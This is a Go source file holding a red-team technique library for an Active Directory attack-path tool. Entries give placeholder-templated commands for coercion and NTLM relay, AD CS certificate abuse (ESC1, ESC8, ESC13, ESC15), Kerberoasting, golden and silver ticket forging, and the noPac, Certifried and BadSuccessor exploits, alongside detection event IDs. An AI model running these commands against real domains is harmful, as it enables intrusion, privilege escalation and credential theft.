package abuse

import "github.com/krazybeastx1/omenhound/pkg/model"

// The technique library shown in the Inspector when nothing is selected. It is
// read-only reference material: commands keep their {PLACEHOLDER} tokens and
// nothing here is ever executed by OmenHound.
//
// Placeholders used across the library:
//
//	{DOMAIN}       AD DNS domain, e.g. corp.local
//	{DC}           domain controller host or IP
//	{SOURCE_SAM}   the principal you control (an edge's source)
//	{TARGET_SAM}   the target account's sAMAccountName
//	{TARGET_DN}    the target object's distinguished name
//	{TARGET_FQDN}  the target host's FQDN
//	{LISTENER}     host/IP you control that receives coerced authentications
//	{CA}           certificate authority name or host
//	{TEMPLATE}     certificate template name
//	{SPN}          servicePrincipalName (silver ticket)
//	{KRBTGT_HASH}  krbtgt NT hash (golden ticket)
//	{SERVICE_HASH} service account NT hash (silver ticket)
//	{DOMAIN_SID}   domain SID (S-1-5-21-...)
//	{AES256}       AES256 key for a created machine account

// PlaybookTechnique is one entry in the Inspector's browsable technique
// library. Unlike Rendered it is not bound to a concrete edge, so the command
// keeps its placeholders and doubles as a reference to fill in by hand.
type PlaybookTechnique struct {
	ID         string   `json:"id"`
	Title      string   `json:"title"`
	Edge       string   `json:"edge,omitempty"`
	Summary    string   `json:"summary"`
	Read       string   `json:"read,omitempty"`
	Command    string   `json:"command"`
	Alternates []string `json:"alternates,omitempty"`
	OPSEC      string   `json:"opsec,omitempty"`
	EventIDs   []int    `json:"event_ids,omitempty"`
	Requires   string   `json:"requires,omitempty"`
	Tags       []string `json:"tags,omitempty"`
}

// PlaybookCategory groups related techniques for display.
type PlaybookCategory struct {
	ID         string              `json:"id"`
	Title      string              `json:"title"`
	Note       string              `json:"note,omitempty"`
	Techniques []PlaybookTechnique `json:"techniques"`
}

// edgeEntry names one graph edge in the library. The command, OPSEC and event
// IDs are pulled from templates.go so the library and the per-edge renderer
// cannot drift apart.
type edgeEntry struct {
	kind  model.EdgeKind
	title string
	tags  []string
}

// edgeGroup maps an operator-facing heading onto existing edge templates.
type edgeGroup struct {
	id    string
	title string
	note  string
	edges []edgeEntry
}

var playbookEdgeGroups = []edgeGroup{
	{
		id:    "acl",
		title: "Access control (ACL)",
		note:  "These are graph edges. Select the edge on the canvas for the same command rendered with the real source and target.",
		edges: []edgeEntry{
			{model.EdgeGenericAll, "Full control over the object", []string{"acl", "write"}},
			{model.EdgeWriteDacl, "Edit the DACL (grant yourself rights)", []string{"acl", "write"}},
			{model.EdgeWriteOwner, "Take ownership, then rewrite the DACL", []string{"acl", "write"}},
			{model.EdgeOwns, "Owns the object (implicit WriteDacl)", []string{"acl", "write"}},
			{model.EdgeGenericWrite, "Write object properties", []string{"acl", "write"}},
			{model.EdgeAllExtendedRights, "All extended rights", []string{"acl", "write"}},
			{model.EdgeForceChangePassword, "Force a password reset", []string{"acl", "password"}},
			{model.EdgeAddMember, "Add a principal to a group", []string{"acl", "group"}},
			{model.EdgeAddSelf, "Add yourself to a group", []string{"acl", "group"}},
			{model.EdgeWriteAltSecurityIdentities, "Write altSecurityIdentities (certificate mapping)", []string{"acl", "adcs"}},
			{model.EdgeWriteSPN, "Write servicePrincipalName (targeted Kerberoast)", []string{"acl", "kerberos"}},
			{model.EdgeWriteAccountRestrictions, "Write account restrictions", []string{"acl"}},
			{model.EdgeAddKeyCredentialLink, "Shadow credentials (add key credential link)", []string{"acl", "adcs"}},
		},
	},
	{
		id:    "credentials",
		title: "Credential access",
		note:  "Replication rights and secret readers. DCSync-equivalent access is among the highest-signal changes to monitor.",
		edges: []edgeEntry{
			{model.EdgeDCSync, "Replicate secrets (DCSync)", []string{"replication", "secrets"}},
			{model.EdgeGetChanges, "Replicate changes", []string{"replication"}},
			{model.EdgeGetChangesAll, "Replicate all changes", []string{"replication"}},
			{model.EdgeGetChangesInFilteredSet, "Replicate a filtered set", []string{"replication"}},
			{model.EdgeReadLAPSPassword, "Read a LAPS password", []string{"secrets"}},
			{model.EdgeReadGMSAPassword, "Read a gMSA password", []string{"secrets"}},
			{model.EdgeDumpSMSAPassword, "Dump SYSKEY/SMSA data", []string{"secrets"}},
		},
	},
	{
		id:    "delegation",
		title: "Delegation",
		note:  "Kerberos delegation abuse. RBCD requires control of the object that holds msDS-AllowedToActOnBehalfOfOtherIdentity.",
		edges: []edgeEntry{
			{model.EdgeAllowedToDelegate, "Constrained delegation to this SPN", []string{"kerberos", "delegation"}},
			{model.EdgeAllowedToAct, "Resource-based constrained delegation (target)", []string{"kerberos", "delegation"}},
			{model.EdgeAddAllowedToAct, "Grant resource-based constrained delegation", []string{"kerberos", "delegation"}},
		},
	},
	{
		id:    "remote",
		title: "Remote execution & sessions",
		note:  "Access to a host. An edge here is an access path, not proof that the current credentials work.",
		edges: []edgeEntry{
			{model.EdgeAdminTo, "Local administrator", []string{"remote"}},
			{model.EdgeCanPSRemote, "WinRM / PowerShell remoting", []string{"remote"}},
			{model.EdgeExecuteDCOM, "DCOM execution", []string{"remote"}},
			{model.EdgeCanRDP, "RDP access", []string{"remote"}},
			{model.EdgeHasSession, "Observed session (credential material on host)", []string{"remote", "session"}},
		},
	},
	{
		id:    "structure",
		title: "Directory structure & trust",
		note:  "Structural edges. They explain reachability and lateral movement between objects, containers and domains.",
		edges: []edgeEntry{
			{model.EdgeMemberOf, "Group membership", []string{"structure", "group"}},
			{model.EdgeContains, "Containment (OU/container holds the object)", []string{"structure"}},
			{model.EdgeGPLink, "GPO applied to the object", []string{"structure", "gpo"}},
			{model.EdgeWriteGPLink, "Write a GPO link", []string{"structure", "gpo"}},
			{model.EdgeTrustedBy, "Domain trust", []string{"structure", "trust"}},
		},
	},
}

// playbookExtraGroups are techniques that no single graph edge represents.
// Each command is the documented invocation for the named tool; it is never
// run by OmenHound.
var playbookExtraGroups = []PlaybookCategory{
	{
		ID:    "coercion",
		Title: "Coercion & relay",
		Note:  "Force a machine account to authenticate to a listener you control, then relay or crack the authentication. Coercion needs network reachability and often only low-privileged credentials.",
		Techniques: []PlaybookTechnique{
			{
				ID:      "petitpotam",
				Title:   "PetitPotam (MS-EFSRPC)",
				Summary: "Coerce a machine account into authenticating to your listener via the Encrypting File System RPC interface.",
				Read:    "coercer scan -u {SOURCE_SAM} -p '<password>' -d {DOMAIN} -t {TARGET_FQDN}",
				Command: "python3 PetitPotam.py -u {SOURCE_SAM} -p '<password>' -d {DOMAIN} {LISTENER} {TARGET_FQDN}",
				Alternates: []string{
					"# then relay the coerced machine auth to AD CS (ESC8)",
					"impacket-ntlmrelayx -t http://{CA} -smb2support --adcs --template DomainController",
				},
				OPSEC:    "The EFSRPC call arrives from the attacker host; the coerced machine account then makes a network logon to {LISTENER}. Cross-reference the two hosts and look for machine-account logons that no scheduled task explains.",
				EventIDs: []int{4624},
				Requires: "Network access to the target's EFSRPC endpoint (usually TCP 445), plus credentials (or a null session) for the RPC call.",
				Tags:     []string{"coercion", "relay", "rpc"},
			},
			{
				ID:       "printerbug",
				Title:    "PrinterBug (MS-RPRN)",
				Summary:  "Trigger the print spooler to authenticate to your listener with RpcRemoteFindFirstPrinterChangeNotification.",
				Read:     "impacket-rpcdump {TARGET_FQDN} | grep -A 6 'spoolsv'",
				Command:  "python3 printerbug.py '{DOMAIN}/{SOURCE_SAM}:<password>@{TARGET_FQDN}' {LISTENER}",
				OPSEC:    "The spooler service opens a connection to {LISTENER}. Spooler-based coercion is blocked on patched hosts when the spooler is disabled; a 4624/4625 network logon for the machine account is the visible artefact.",
				EventIDs: []int{4624, 4625},
				Requires: "Print spooler running on the target (common on domain controllers unless disabled).",
				Tags:     []string{"coercion", "relay", "spooler"},
			},
			{
				ID:       "dfscoerce",
				Title:    "DFSCoerce (MS-DFSNM)",
				Summary:  "Coerce authentication through the Distributed File System Namespace Management interface.",
				Read:     "coercer scan -u {SOURCE_SAM} -p '<password>' -d {DOMAIN} -t {TARGET_FQDN}",
				Command:  "python3 dfscoerce.py -u {SOURCE_SAM} -p '<password>' -d {DOMAIN} {LISTENER} {TARGET_FQDN}",
				OPSEC:    "Works where the spooler is disabled because it uses the DFS namespace RPC interface instead. Same relay/detection story: an unexpected machine-account network logon to {LISTENER}.",
				EventIDs: []int{4624},
				Requires: "Reachability to the DFS Namespace Management RPC endpoint on the target.",
				Tags:     []string{"coercion", "relay", "rpc", "dfs"},
			},
			{
				ID:       "shadowcoerce",
				Title:    "ShadowCoerce (MS-FSRVP)",
				Summary:  "Coerce authentication through the File Server Remote VSS Protocol interface.",
				Read:     "coercer scan -u {SOURCE_SAM} -p '<password>' -d {DOMAIN} -t {TARGET_FQDN}",
				Command:  "python3 shadowcoerce.py -u {SOURCE_SAM} -p '<password>' -d {DOMAIN} {LISTENER} {TARGET_FQDN}",
				OPSEC:    "Uses the FSRVP interface exposed by the File Server VSS Agent Service. Same detection: machine-account authentication to an unexpected listener.",
				EventIDs: []int{4624},
				Requires: "The File Server VSS Agent Service running on the target.",
				Tags:     []string{"coercion", "relay", "rpc", "vss"},
			},
			{
				ID:      "coercer",
				Title:   "Coercer (multi-protocol)",
				Summary: "Try every known coercion method in sequence and report which ones produced an authentication.",
				Read:    "coercer scan -u {SOURCE_SAM} -p '<password>' -d {DOMAIN} -t {TARGET_FQDN}",
				Command: "coercer coerce -u {SOURCE_SAM} -p '<password>' -d {DOMAIN} -t {TARGET_FQDN} -l {LISTENER}",
				Alternates: []string{
					"# probe first, then coerce",
					"coercer scan -u {SOURCE_SAM} -p '<password>' -d {DOMAIN} -t {TARGET_FQDN}",
				},
				OPSEC:    "Coercer cycles through many RPC methods, so it is noisier than a single technique but quicker to confirm the viable one.",
				EventIDs: []int{4624, 4625},
				Requires: "A listener you control on {LISTENER} to observe the incoming authentications.",
				Tags:     []string{"coercion", "relay", "rpc"},
			},
			{
				ID:       "ldap-relay",
				Title:    "NTLM relay to LDAP (RBCD / shadow credentials)",
				Summary:  "Relay a coerced authentication to LDAP/S to grant yourself resource-based constrained delegation on a machine account.",
				Read:     "# verify LDAP signing and channel binding are not required on {DC} (e.g. LdapRelayScan) before relaying",
				Command:  "impacket-ntlmrelayx -t ldap://{DC} --escalate-user {SOURCE_SAM} -smb2support",
				OPSEC:    "Only works where LDAP signing and channel binding are not enforced. --escalate-user rewrites msDS-AllowedToActOnBehalfOfOtherIdentity, a 5136 change on the target computer.",
				EventIDs: []int{5136},
				Requires: "LDAP signing not required; an inbound authentication to relay (pair with a coercion technique).",
				Tags:     []string{"relay", "ldap", "rbcd"},
			},
		},
	},
	{
		ID:    "adcs",
		Title: "AD CS (certificate services)",
		Note:  "Certipy is installed here as certipy-ad; older releases name the same binary certipy. Always start from an enumeration pass.",
		Techniques: []PlaybookTechnique{
			{
				ID:       "certipy-find",
				Title:    "Enumerate AD CS",
				Summary:  "Find certificate authorities and flag vulnerable templates (ESC1/13/15) and web enrollment (ESC8).",
				Read:     "nxc ldap {DC} -u {SOURCE_SAM} -p '<password>' -M adcs",
				Command:  "certipy-ad find -u {SOURCE_SAM}@{DOMAIN} -p '<password>' -dc-ip {DC} -vulnerable -stdout",
				OPSEC:    "Read-only LDAP and CA queries. Useful for the report even without exploitation; low noise.",
				Requires: "Any authenticated domain user.",
				Tags:     []string{"adcs", "recon"},
			},
			{
				ID:      "esc1",
				Title:   "ESC1 — enrollee-supplied SAN",
				Summary: "Request a template that lets the enrollee set the subject alternative name, then authenticate as that principal.",
				Read:    "certipy-ad find -u {SOURCE_SAM}@{DOMAIN} -p '<password>' -dc-ip {DC} -vulnerable -stdout",
				Command: "certipy-ad req -u {SOURCE_SAM}@{DOMAIN} -p '<password>' -dc-ip {DC} -ca {CA} -template {TEMPLATE} -upn administrator@{DOMAIN}",
				Alternates: []string{
					"certipy-ad auth -pfx administrator.pfx -dc-ip {DC}",
				},
				OPSEC:    "The CA records a certificate issuance (4886/4887). An unexpected subject for a normal template is the tell.",
				EventIDs: []int{4886, 4887},
				Requires: "A template that allows SAN specification and enrolment by your principal.",
				Tags:     []string{"adcs", "esc1", "certificate"},
			},
			{
				ID:      "esc8",
				Title:   "ESC8 — relay to HTTP enrollment",
				Summary: "Relay a coerced machine authentication to the CA's HTTP enrollment endpoint to obtain a certificate for that machine.",
				Read:    "certipy-ad find -u {SOURCE_SAM}@{DOMAIN} -p '<password>' -dc-ip {DC} -stdout | grep -B20 ESC8",
				Command: "certipy-ad relay -target http://{CA} -template DomainController",
				Alternates: []string{
					"# start the relay, then coerce the DC to authenticate to it",
					"python3 PetitPotam.py -u {SOURCE_SAM} -p '<password>' -d {DOMAIN} {LISTENER} {TARGET_FQDN}",
					"certipy-ad auth -pfx dc.pfx -dc-ip {DC}",
				},
				OPSEC:    "Relaying a domain controller needs the DomainController template; the CA logs the issuance. Pair the relay with a coercion source so the timing is explainable.",
				EventIDs: []int{4886, 4887},
				Requires: "HTTP enrollment (certsrv) reachable and not requiring EPA/channel binding, plus an inbound authentication to relay.",
				Tags:     []string{"adcs", "esc8", "relay"},
			},
			{
				ID:      "esc13",
				Title:   "ESC13 — issuance policy group link",
				Summary: "Request a template whose issuance policy is linked to a privileged group; the resulting certificate carries that group in the PAC.",
				Read:    "certipy-ad find -u {SOURCE_SAM}@{DOMAIN} -p '<password>' -dc-ip {DC} -stdout | grep -B20 ESC13",
				Command: "certipy-ad req -u {SOURCE_SAM}@{DOMAIN} -p '<password>' -dc-ip {DC} -ca {CA} -template {TEMPLATE}",
				Alternates: []string{
					"certipy-ad auth -pfx {SOURCE_SAM}.pfx -dc-ip {DC}",
				},
				OPSEC:    "A template OID is linked to a group; the certificate is valid and there is no attribute change to detect. Audit template issuance-policy links and CA issuance.",
				EventIDs: []int{4886, 4887},
				Requires: "A published template with an issuance policy tied to a group you want to assume.",
				Tags:     []string{"adcs", "esc13", "certificate"},
			},
			{
				ID:      "esc15",
				Title:   "ESC15 — EKUwu (application policy injection)",
				Summary: "Inject a Client Authentication application policy into a version-1 template request to obtain an authentication certificate.",
				Read:    "certipy-ad find -u {SOURCE_SAM}@{DOMAIN} -p '<password>' -dc-ip {DC} -stdout | grep -B20 ESC15",
				Command: "certipy-ad req -u {SOURCE_SAM}@{DOMAIN} -p '<password>' -dc-ip {DC} -ca {CA} -template {TEMPLATE} -application-policies '1.3.6.1.5.5.7.3.2' -upn administrator@{DOMAIN}",
				Alternates: []string{
					"certipy-ad auth -pfx administrator.pfx -dc-ip {DC}",
				},
				OPSEC:    "Abuses how v1 templates merge requested application policies (CVE-2024-49019). The CA issuance is the visible event.",
				EventIDs: []int{4886, 4887},
				Requires: "A version-1 template you can enrol in.",
				Tags:     []string{"adcs", "esc15", "certificate"},
			},
		},
	},
	{
		ID:    "roasting",
		Title: "Roasting, GPP & tickets",
		Note:  "Credential-capture and ticket-forgery techniques. Cracked or forged material is used the same way as a password.",
		Techniques: []PlaybookTechnique{
			{
				ID:       "kerberoast",
				Title:    "Kerberoast",
				Summary:  "Request service tickets for accounts with an SPN and crack them offline.",
				Read:     "impacket-GetUserSPNs '{DOMAIN}/{SOURCE_SAM}:<password>' -dc-ip {DC}",
				Command:  "impacket-GetUserSPNs '{DOMAIN}/{SOURCE_SAM}:<password>' -dc-ip {DC} -request -outputfile kerberoast.txt",
				OPSEC:    "Each request is a 4769 service-ticket event; requesting many in a short window from one account is a strong Kerberoasting signature.",
				EventIDs: []int{4769},
				Requires: "Any authenticated domain user.",
				Tags:     []string{"kerberos", "cracking"},
			},
			{
				ID:      "asreproast",
				Title:   "AS-REP roast",
				Summary: "Request a TGT for accounts with Kerberos pre-authentication disabled and crack it offline.",
				Read:    "impacket-GetNPUsers '{DOMAIN}/{SOURCE_SAM}:<password>' -dc-ip {DC}",
				Command: "impacket-GetNPUsers '{DOMAIN}/{SOURCE_SAM}' -dc-ip {DC} -request -format hashcat -outputfile asrep.txt",
				Alternates: []string{
					"# unauthenticated variant with a username list",
					"impacket-GetNPUsers {DOMAIN}/ -usersfile users.txt -dc-ip {DC} -request -no-pass",
				},
				OPSEC:    "4768 TGT requests with pre-authentication not required. Accounts with DONT_REQ_PREAUTH are the target; the requests stand out against the baseline.",
				EventIDs: []int{4768},
				Requires: "Accounts with Kerberos pre-authentication disabled.",
				Tags:     []string{"kerberos", "cracking", "asrep"},
			},
			{
				ID:      "gpp",
				Title:   "GPP cpassword in SYSVOL",
				Summary: "Group Policy Preferences stored AES-encrypted passwords in SYSVOL; the key is public, so any cpassword found in the policy files decrypts.",
				Read:    "impacket-Get-GPPPassword '{DOMAIN}/{SOURCE_SAM}:<password>@{DC}'",
				Command: "gpp-decrypt '<cpassword>'",
				Alternates: []string{
					"# find cpassword in the domain's SYSVOL policy files first",
					"grep -ri cpassword /mnt/sysvol/",
				},
				OPSEC:    "Reading SYSVOL is ordinary domain traffic (share access can be 5145), so this is a low-signal collection step on legacy domains.",
				EventIDs: []int{5145},
				Requires: "A GPP password (cpassword) still present in SYSVOL.",
				Tags:     []string{"gpp", "sysvol"},
			},
			{
				ID:       "golden-ticket",
				Title:    "Golden ticket (krbtgt)",
				Summary:  "Forge a TGT with the krbtgt key to impersonate any principal in the domain.",
				Read:     "impacket-secretsdump '{DOMAIN}/{SOURCE_SAM}:<password>@{DC}' -just-dc-user krbtgt",
				Command:  "impacket-ticketer -nthash {KRBTGT_HASH} -domain-sid {DOMAIN_SID} -domain {DOMAIN} administrator",
				OPSEC:    "Forge with an unusual lifetime and it is caught; with a default lifetime it can be hard to see. krbtgt rotation invalidates all forged TGTs.",
				EventIDs: []int{4768, 4769},
				Requires: "The krbtgt NT hash and the domain SID (i.e. domain compromise).",
				Tags:     []string{"kerberos", "persistence", "ticket"},
			},
			{
				ID:       "silver-ticket",
				Title:    "Silver ticket (service account)",
				Summary:  "Forge a service ticket with a service account's key to access that service without touching the DC.",
				Read:     "impacket-GetUserSPNs '{DOMAIN}/{SOURCE_SAM}:<password>' -dc-ip {DC}",
				Command:  "impacket-ticketer -nthash {SERVICE_HASH} -domain-sid {DOMAIN_SID} -domain {DOMAIN} -spn {SPN} administrator",
				OPSEC:    "The DC never sees the ticket request, so there is no 4769 on the DC; the target service logs the logon. Rotating the service account's password invalidates forged tickets.",
				EventIDs: []int{4624},
				Requires: "The NT hash of the account running the target service.",
				Tags:     []string{"kerberos", "persistence", "ticket"},
			},
		},
	},
	{
		ID:    "cve",
		Title: "Known CVEs",
		Note:  "Version-specific privilege escalation. Confirm the target build before relying on any of these; patches may have landed.",
		Techniques: []PlaybookTechnique{
			{
				ID:       "nopac",
				Title:    "noPac (CVE-2021-42278 / CVE-2021-42287)",
				Summary:  "Create a machine account, spoof a domain controller's name, obtain a ticket and impersonate an administrator, then rename back.",
				Read:     "nxc smb {DC} -u {SOURCE_SAM} -p '<password>' -M nopac",
				Command:  "python3 noPac.py {DOMAIN}/{SOURCE_SAM}:<password> -dc-ip {DC} -dc-host {DC} -shell --impersonate administrator -use-ldap",
				OPSEC:    "The attack creates a machine account and renames it to a DC name (4741, 4781) — a very unusual pair for a normal user account.",
				EventIDs: []int{4741, 4781, 4769},
				Requires: "MachineAccountQuota > 0 (default 10) and an unpatched domain controller.",
				Tags:     []string{"cve", "kerberos"},
			},
			{
				ID:      "certifried",
				Title:   "Certifried (CVE-2022-26923)",
				Summary: "Create a machine account with a spoofed dNSHostName, request a Machine certificate, and authenticate as the spoofed host.",
				Read:    "nxc ldap {DC} -u {SOURCE_SAM} -p '<password>' -M maq",
				Command: "certipy-ad account create -u {SOURCE_SAM}@{DOMAIN} -p '<password>' -dc-ip {DC} -user 'EVIL$' -pass '<password>' -dns {TARGET_FQDN}",
				Alternates: []string{
					"certipy-ad req -u 'EVIL$@{DOMAIN}' -p '<password>' -dc-ip {DC} -ca {CA} -template Machine",
					"certipy-ad auth -pfx evil.pfx -dc-ip {DC}",
				},
				OPSEC:    "A newly created computer account (4741) with a dNSHostName that already belongs to another host (5136) is the signature.",
				EventIDs: []int{4741, 5136, 4886},
				Requires: "MachineAccountQuota > 0, AD CS, and an unpatched domain (May 2022 update fixes the SAN handling).",
				Tags:     []string{"cve", "adcs"},
			},
			{
				ID:      "badsuccessor",
				Title:   "BadSuccessor (CVE-2025-53779, dMSA)",
				Summary: "Create a delegated MSA in an OU where you have CreateChild, link it to a privileged account, and authenticate as that account.",
				Read:    "nxc ldap {DC} -u {SOURCE_SAM} -p '<password>' --query '(objectClass=msDS-DelegatedManagedServiceAccount)' 'distinguishedName'",
				Command: "Invoke-BadSuccessor -PrecededByIdentity '{TARGET_SAM}'",
				Alternates: []string{
					"# manual equivalent: create a dMSA, then set these two attributes",
					"#   msDS-ManagedAccountPrecededByLink = '{TARGET_DN}'",
					"#   msDS-DelegatedMSAState = 2",
					"Rubeus.exe asktgs /targetuser:<dMSA>$ /service:krbtgt/{DOMAIN} /dmsa /opsec /ptt /ticket:<base64-tgt>",
				},
				OPSEC:    "Needs Windows Server 2025 DCs. Creating a dMSA is 5137, the attribute write is 5136, and a dMSA TGT produces Directory Service event 2946.",
				EventIDs: []int{5136, 5137, 2946},
				Requires: "CreateChild (or Create msDS-DelegatedManagedServiceAccount) on an OU, and a Windows Server 2025 domain controller.",
				Tags:     []string{"cve", "dmsa", "kerberos"},
			},
		},
	},
	{
		ID:    "setup",
		Title: "Recon & setup",
		Note:  "Collect and prepare. These are the steps that produce the graph data the other techniques depend on.",
		Techniques: []PlaybookTechnique{
			{
				ID:      "addcomputer",
				Title:   "Create a machine account (MachineAccountQuota)",
				Summary: "Add a computer account you control, the prerequisite for RBCD, noPac and Certifried.",
				Read:    "nxc ldap {DC} -u {SOURCE_SAM} -p '<password>' -M maq",
				Command: "impacket-addcomputer -computer-name 'EVIL$' -computer-pass '<password>' -dc-ip {DC} '{DOMAIN}/{SOURCE_SAM}:<password>'",
				Alternates: []string{
					"# set the password of an existing computer account via LDAPS",
					"impacket-addcomputer -computer-name 'TARGET$' -computer-pass '<password>' -dc-ip {DC} -method LDAPS -no-add '{DOMAIN}/{SOURCE_SAM}:<password>'",
				},
				OPSEC:    "The new account is a 4741 event and, if you hold it, an easy IoC. Domains that set MachineAccountQuota to 0 block the default route.",
				EventIDs: []int{4741},
				Requires: "MachineAccountQuota > 0 (default) and a writable Computers container.",
				Tags:     []string{"setup", "account"},
			},
			{
				ID:      "enumerate",
				Title:   "Enumerate the domain",
				Summary: "Collect users, groups and shares, or a full BloodHound graph, to feed OmenHound.",
				Read:    "nxc ldap {DC} -u {SOURCE_SAM} -p '<password>' --query '(objectClass=domain)' 'distinguishedName'",
				Command: "nxc ldap {DC} -u {SOURCE_SAM} -p '<password>' --users --groups --shares",
				Alternates: []string{
					"bloodhound-python -u {SOURCE_SAM} -p '<password>' -d {DOMAIN} -ns {DC} -c all",
				},
				OPSEC:    "LDAP enumeration produces directory-service access (4662) depending on the audit policy. Keep the rate low — OmenHound's own collector is paced for the same reason.",
				EventIDs: []int{4662},
				Requires: "Any authenticated domain user (read rights on the directory).",
				Tags:     []string{"recon", "ldap"},
			},
		},
	},
}

// Playbook returns the full technique library for the Inspector. Edge-backed
// techniques reuse templates.go so there is a single source of truth.
func Playbook() []PlaybookCategory {
	out := make([]PlaybookCategory, 0, len(playbookEdgeGroups)+len(playbookExtraGroups))
	for _, g := range playbookEdgeGroups {
		cat := PlaybookCategory{ID: g.id, Title: g.title, Note: g.note}
		for _, e := range g.edges {
			t, ok := Templates[e.kind]
			if !ok {
				continue
			}
			cat.Techniques = append(cat.Techniques, PlaybookTechnique{
				ID:         string(e.kind),
				Title:      e.title,
				Edge:       string(e.kind),
				Summary:    t.Summary,
				Read:       t.Read,
				Command:    t.Command,
				Alternates: t.Alternates,
				OPSEC:      t.OPSEC,
				EventIDs:   t.EventIDs,
				Requires:   t.RequiresAuth,
				Tags:       e.tags,
			})
		}
		out = append(out, cat)
	}
	out = append(out, playbookExtraGroups...)
	return out
}
